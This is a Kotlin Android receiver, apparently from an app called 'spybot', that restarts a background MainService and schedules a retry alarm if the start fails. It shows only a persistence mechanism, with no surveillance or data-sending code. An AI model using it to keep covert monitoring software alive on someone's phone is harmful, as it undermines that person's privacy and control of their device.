package com.spybot.app.Receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import androidx.core.content.ContextCompat
import com.spybot.app.MainService

class RestartReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (!shouldServiceRun(context)) return

        try {
            val serviceIntent = Intent(context, MainService::class.java).apply { action = MainService.ACTION_START }
            ContextCompat.startForegroundService(context, serviceIntent)
        } catch (e: Exception) {
            MainService.scheduleRestartAlarm(context, 3000)
        }
    }

    private fun shouldServiceRun(context: Context): Boolean {
        return context.getSharedPreferences("spybot_prefs", Context.MODE_PRIVATE)
            .getBoolean("service_enabled", true)
    }
}
